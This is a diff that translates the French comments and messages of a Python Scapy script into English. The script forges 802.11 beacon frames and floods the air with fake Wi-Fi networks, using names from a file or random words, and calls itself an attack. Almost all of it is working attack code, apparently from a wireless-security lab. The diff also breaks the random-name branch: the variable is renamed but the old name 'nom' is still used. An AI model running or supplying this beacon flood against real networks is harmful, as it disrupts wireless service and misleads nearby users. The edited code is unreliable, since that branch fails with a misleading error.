@@ -9,39 +9,39 @@ from chance import chance
 from scapy.all import *
 #source : https://stackoverflow.com/questions/15318208/capture-control-c-in-python
 #source : https://github.com/davitv/chance
-print("Emission de beacons avec des noms selon un fichier ou au hasard. Utilisez CTRL+C pour quitter ou stopper l'attaque.")
+print("Beacons generation with names from a file or randomly generated, use CTRL+C to quit or stop the attack.")
 try:
-    parser = argparse.ArgumentParser(description="Ce script permet de générer de faux SSID selon les entrée d'un fichier ou avec des noms aléatoire.")
-    parser.add_argument("-f", "--file",type=str, help="Le fichier contenant les noms d'ap souhaités.")
-    parser.add_argument("-i", "--interface", required=True, help="L'interface à utiliser")
+    parser = argparse.ArgumentParser(description="This scrips is used to generate false SSID, the SSID names come from a file or are randomly generated.")
+    parser.add_argument("-f", "--file",type=str, help="The file containing the desired names.")
+    parser.add_argument("-i", "--interface", required=True, help="The interface to use")
     arguments = parser.parse_args()
     packets = []
-    #Si aucun fichier n'est passé en parametre, on demande un chiffre à l'utilisateur
+    #If no file is specified using the -f option, we ask the user for a number
     if(arguments.file is None):
             try:
-                nbSSID = int(input("Entrez le nombre de SSID que vous souhaitez avoir\n"))
+                nbSSID = int(input("Please enter the number of different SSID you want to have.\n"))
                 for i in range(0,nbSSID):
-                    #Creation des packets beacons a la vollée depuis une adresse MAC aléatoire et un SSID étant un nom anglais aléatoire.
+                    #Creation of the beacons packet using a random src MAC and the broadcat MAC as destination. The name is random.
                     src = RandMAC()
-                    nom = chance.word(language="en")
+                    name = chance.word(language="en")
                     packets.append(RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=src, addr3=src) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=nom) / Dot11Elt())
-                    print("Un wifi est disponible avec le nom:",nom)
-            #Crash du soft si l'utilisateur entre pas un nombre.
+                    print("One Wifi should be visible with the name :",name)
+            #The application exit if the user does not provide a number.
             except:
-                print("Merci d'entrer un nombre!")
+                print("Please, enter a number!")
                 sys.exit()
-    #Si un fichier est spécifié, chaque ligne est un nom de wifi
+    #If a file is provided, each line is a new wifi name.
     else:   
         files = open(arguments.file,"r")
         lines = files.readlines()
         for line in lines:
             src = RandMAC()
             packets.append(RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=src, addr3=src) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=line) / Dot11Elt())
-            print("Un wifi est disponible avec le nom:",line)
-    #On envoie des beacons indéfiniment jusqu'a interuption de l'utilisateur
+            print("One Wifi should be visible with the name :",line)
+    #Once we got our beacons list, we loop indefinitely on it to send beacons.
     while(1):
         for packet in packets:
             sendp(packet,inter=0.000001, iface=arguments.interface, verbose=0)
 except KeyboardInterrupt:
-    print("\nAu revoir!")
+    print("\nBye!")
     sys.exit()
